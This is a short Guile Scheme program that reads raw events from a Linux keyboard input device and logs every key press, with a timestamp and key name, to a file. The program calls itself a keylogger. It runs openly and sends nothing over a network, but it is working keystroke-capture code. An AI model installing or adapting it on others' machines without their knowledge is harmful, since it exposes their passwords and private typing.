(use-modules
 (srfi srfi-9)
 (system foreign)
 (ice-9 binary-ports)
 (rnrs bytevectors)
 (system foreign-object)
 (ev-codes))

;; Create handler for libinput
(define libinput (dynamic-link "input.so"))

(define* (get bv #:optional (type 'code))
  (let* ((fn (format #f "get_~a" type))
	 (method (pointer->procedure
		  int
		  (dynamic-func fn libinput)
		  '(*))))
    (method (bytevector->pointer bv))))

(define (main args)
  (let* ((device-name (car (cdr args)))
	 (log (open-output-file (car (reverse (cdr args)))))
	 (kbd (open-input-file device-name #:binary #t)))
    
    (format #t "Reading from device ~a\n" device-name)
    (format log "# time; event; code; key\n")

    (let* ((nbytes 24)
	   (bv (make-bytevector nbytes))
	   (code 0)
	   (quit #f))
      
      (while (not quit)
	(get-bytevector-n! kbd bv 0 nbytes)
	(set! code (get bv))	   
	(when (= 1 (get bv 'value)) ;; key press
	  (format log "~a;press;~a;~a\n"
		  (strftime "%c" (localtime (current-time)))
		  code
		  (cdr (assq code event-codes))))
	;; Catch Ctrl+C
	(sigaction SIGINT
	  (lambda (x)
	    (format #t "\nPressed Ctrl+C. Finishing keylogger...\n")
	    (set! quit #t))))
      (close kbd)
      (close log))))
